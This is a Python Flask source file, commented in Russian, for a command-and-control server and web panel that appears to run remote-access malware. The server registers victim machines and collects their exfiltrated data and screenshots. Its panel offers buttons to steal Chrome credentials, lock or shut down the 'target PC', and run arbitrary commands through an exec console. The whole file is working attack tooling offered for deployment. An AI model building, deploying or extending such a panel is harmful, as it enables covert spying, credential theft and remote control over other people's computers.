# =====================================================================
# СЕРВЕР С КРУТЫМ ДИЗАЙНОМ
# Сохранить как server.py
# Загрузить на GitHub и передеплоить на Render
# =====================================================================
from flask import Flask, request, jsonify
import time
import base64
import io

app = Flask(__name__)

clients = {}
commands = {}

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    client_id = str(int(time.time() * 1000))
    clients[client_id] = {
        "hostname": data.get("hostname"),
        "username": data.get("username"),
        "os": data.get("os"),
        "last_seen": time.time(),
        "data": []
    }
    commands[client_id] = []
    return jsonify({"id": client_id})

@app.route('/data/<client_id>', methods=['POST'])
def receive_data(client_id):
    if client_id in clients:
        data = request.json
        clients[client_id]["data"].append(data)
        clients[client_id]["last_seen"] = time.time()
        
        # Если скриншот - сохраняем как файл
        if data.get("type") == "screenshot":
            clients[client_id]["last_screenshot"] = data.get("data", "")
    return jsonify({"status": "ok"})

@app.route('/screenshot/<client_id>')
def get_screenshot(client_id):
    if client_id in clients and "last_screenshot" in clients[client_id]:
        img_data = base64.b64decode(clients[client_id]["last_screenshot"])
        return img_data, 200, {'Content-Type': 'image/jpeg'}
    return "No screenshot", 404

@app.route('/command/<client_id>', methods=['GET'])
def send_command(client_id):
    if client_id in commands and commands[client_id]:
        return jsonify(commands[client_id].pop(0))
    return jsonify({"command": "ping"})

@app.route('/clients', methods=['GET'])
def get_clients():
    result = {}
    for cid, info in clients.items():
        if time.time() - info["last_seen"] < 30:
            result[cid] = {
                "hostname": info["hostname"],
                "username": info["username"],
                "os": info["os"],
                "has_screenshot": "last_screenshot" in info
            }
    return jsonify(result)

@app.route('/send_command/<client_id>', methods=['POST'])
def add_command(client_id):
    if client_id in commands:
        commands[client_id].append(request.json)
    return jsonify({"status": "ok"})

@app.route('/')
def home():
    return """
<!DOCTYPE html>
<html>
<head>
    <title>Control Panel</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: #0f1923; 
            color: #c9d1d9; 
            font-family: 'Segoe UI', Arial, sans-serif;
            height: 100vh;
            display: flex;
        }
        
        .sidebar {
            width: 260px;
            background: #1a2733;
            border-right: 1px solid #2d3a4a;
            display: flex;
            flex-direction: column;
        }
        
        .sidebar-header {
            padding: 20px;
            border-bottom: 1px solid #2d3a4a;
        }
        
        .sidebar-header h2 {
            color: #4fc3f7;
            font-size: 18px;
            font-weight: 600;
        }
        
        .sidebar-header .status {
            color: #81c784;
            font-size: 12px;
            margin-top: 5px;
        }
        
        .client-list {
            flex: 1;
            overflow-y: auto;
            padding: 10px;
        }
        
        .client-item {
            background: #0f1923;
            border: 1px solid #2d3a4a;
            border-radius: 8px;
            padding: 12px;
            margin-bottom: 8px;
            cursor: pointer;
            transition: all 0.2s;
        }
        
        .client-item:hover {
            border-color: #4fc3f7;
            background: #1a2733;
        }
        
        .client-item.active {
            border-color: #4fc3f7;
            background: #1a2733;
            box-shadow: 0 0 10px rgba(79, 195, 247, 0.2);
        }
        
        .client-item .name {
            color: #4fc3f7;
            font-weight: 600;
            font-size: 14px;
        }
        
        .client-item .info {
            color: #8b949e;
            font-size: 11px;
            margin-top: 4px;
        }
        
        .client-item .dot {
            width: 8px;
            height: 8px;
            background: #81c784;
            border-radius: 50%;
            display: inline-block;
            margin-right: 6px;
        }
        
        .main-content {
            flex: 1;
            display: flex;
            flex-direction: column;
        }
        
        .toolbar {
            background: #1a2733;
            border-bottom: 1px solid #2d3a4a;
            padding: 12px 20px;
            display: flex;
            gap: 6px;
            flex-wrap: wrap;
        }
        
        .toolbar button {
            background: #212d3a;
            color: #4fc3f7;
            border: 1px solid #2d3a4a;
            padding: 8px 14px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 12px;
            font-weight: 500;
            transition: all 0.2s;
        }
        
        .toolbar button:hover {
            background: #4fc3f7;
            color: #0f1923;
            border-color: #4fc3f7;
        }
        
        .toolbar button.danger {
            color: #ef5350;
            border-color: #ef5350;
        }
        
        .toolbar button.danger:hover {
            background: #ef5350;
            color: #fff;
        }
        
        .toolbar button.success {
            color: #81c784;
            border-color: #81c784;
        }
        
        .toolbar button.success:hover {
            background: #81c784;
            color: #0f1923;
        }
        
        .content-area {
            flex: 1;
            display: flex;
            padding: 15px;
            gap: 15px;
        }
        
        .screenshot-panel {
            flex: 1;
            background: #1a2733;
            border-radius: 10px;
            border: 1px solid #2d3a4a;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }
        
        .screenshot-panel img {
            max-width: 100%;
            max-height: 100%;
            object-fit: contain;
        }
        
        .screenshot-panel .placeholder {
            color: #455a64;
            font-size: 16px;
            text-align: center;
        }
        
        .console-panel {
            width: 350px;
            background: #0d1117;
            border-radius: 10px;
            border: 1px solid #2d3a4a;
            display: flex;
            flex-direction: column;
        }
        
        .console-header {
            background: #1a2733;
            padding: 10px 15px;
            border-radius: 10px 10px 0 0;
            font-size: 12px;
            font-weight: 600;
            color: #4fc3f7;
            border-bottom: 1px solid #2d3a4a;
        }
        
        .console-output {
            flex: 1;
            overflow-y: auto;
            padding: 10px;
            font-family: 'Consolas', 'Courier New', monospace;
            font-size: 11px;
            color: #81c784;
        }
        
        .console-input {
            display: flex;
            border-top: 1px solid #2d3a4a;
        }
        
        .console-input input {
            flex: 1;
            background: #0d1117;
            border: none;
            color: #81c784;
            padding: 10px;
            font-family: 'Consolas', monospace;
            font-size: 11px;
            outline: none;
        }
        
        .console-input button {
            background: #4fc3f7;
            color: #0f1923;
            border: none;
            padding: 10px 16px;
            cursor: pointer;
            font-weight: 600;
            font-size: 11px;
        }
        
        .console-input button:hover {
            background: #81c784;
        }
        
        .log-entry {
            padding: 3px 0;
            border-bottom: 1px solid #1a2733;
        }
        
        .log-entry .time {
            color: #4fc3f7;
            margin-right: 8px;
        }
        
        .no-selection {
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100%;
            color: #455a64;
            font-size: 18px;
        }
    </style>
</head>
<body>
    <div class="sidebar">
        <div class="sidebar-header">
            <h2>⬡ CONTROL PANEL</h2>
            <div class="status">● Server Online</div>
        </div>
        <div class="client-list" id="clientList">
            <div style="color:#455a64;text-align:center;padding:20px;">Waiting for clients...</div>
        </div>
    </div>
    
    <div class="main-content">
        <div class="toolbar" id="toolbar">
            <button onclick="sendCmd('screenshot')">📸 Screenshot</button>
            <button onclick="sendCmd('sysinfo')">💻 System Info</button>
            <button onclick="sendCmd('steal_chrome')">🔑 Chrome</button>
            <button class="success" onclick="sendCmd('lock')">🔒 Lock</button>
            <button class="success" onclick="sendCmd('unlock')">🔓 Unlock</button>
            <button class="danger" onclick="sendCmd('shutdown')">⏻ Shutdown</button>
            <button class="danger" onclick="sendCmd('restart')">🔄 Restart</button>
            <button onclick="sendMsg()">💬 Message</button>
        </div>
        
        <div class="content-area">
            <div class="screenshot-panel" id="screenshotPanel">
                <div class="placeholder">Select a client and click Screenshot</div>
            </div>
            
            <div class="console-panel">
                <div class="console-header">📋 Console Output</div>
                <div class="console-output" id="console"></div>
                <div class="console-input">
                    <input type="text" id="cmdInput" placeholder="Enter command..." onkeypress="if(event.key==='Enter')execCmd()">
                    <button onclick="execCmd()">EXEC</button>
                </div>
            </div>
        </div>
    </div>
    
    <script>
        let selectedClient = null;
        let clients = {};
        
        function log(msg) {
            let time = new Date().toLocaleTimeString();
            let consoleEl = document.getElementById('console');
            consoleEl.innerHTML += `<div class="log-entry"><span class="time">[${time}]</span>${msg}</div>`;
            consoleEl.scrollTop = consoleEl.scrollHeight;
        }
        
        function updateClients() {
            fetch('/clients')
                .then(r => r.json())
                .then(data => {
                    clients = data;
                    let html = '';
                    for(let id in data) {
                        let c = data[id];
                        let activeClass = (selectedClient === id) ? ' active' : '';
                        html += `
                            <div class="client-item${activeClass}" onclick="selectClient('${id}')">
                                <div class="name"><span class="dot"></span>${c.hostname}</div>
                                <div class="info">👤 ${c.username} | 💻 ${c.os}</div>
                            </div>`;
                    }
                    if(html === '') {
                        html = '<div style="color:#455a64;text-align:center;padding:20px;">No clients connected</div>';
                    }
                    document.getElementById('clientList').innerHTML = html;
                });
        }
        
        function selectClient(id) {
            selectedClient = id;
            updateClients();
            log(`Selected: ${clients[id].hostname}`);
            
            // Показываем скриншот если есть
            if(clients[id].has_screenshot) {
                document.getElementById('screenshotPanel').innerHTML = 
                    `<img src="/screenshot/${id}?t=${Date.now()}" onerror="this.parentElement.innerHTML='<div class=placeholder>Screenshot not available</div>'">`;
            }
        }
        
        function sendCmd(command) {
            if(!selectedClient) {
                alert('Select a client first!');
                return;
            }
            
            fetch('/send_command/' + selectedClient, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({command: command})
            });
            log(`Sent: ${command}`);
            
            if(command === 'screenshot') {
                setTimeout(() => {
                    document.getElementById('screenshotPanel').innerHTML = 
                        `<img src="/screenshot/${selectedClient}?t=${Date.now()}" onerror="this.parentElement.innerHTML='<div class=placeholder>Loading screenshot...</div>'">`;
                }, 2000);
            }
        }
        
        function execCmd() {
            if(!selectedClient) {
                alert('Select a client first!');
                return;
            }
            let cmd = document.getElementById('cmdInput').value;
            if(cmd) {
                fetch('/send_command/' + selectedClient, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({command: 'exec', cmd: cmd})
                });
                log(`Exec: ${cmd}`);
                document.getElementById('cmdInput').value = '';
            }
        }
        
        function sendMsg() {
            if(!selectedClient) {
                alert('Select a client first!');
                return;
            }
            let msg = prompt('Enter message to show on target PC:');
            if(msg) {
                fetch('/send_command/' + selectedClient, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({command: 'message', text: msg})
                });
                log(`Message sent: ${msg}`);
            }
        }
        
        setInterval(updateClients, 2000);
        updateClients();
        log('Panel loaded. Waiting for clients...');
    </script>
</body>
</html>
    """

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
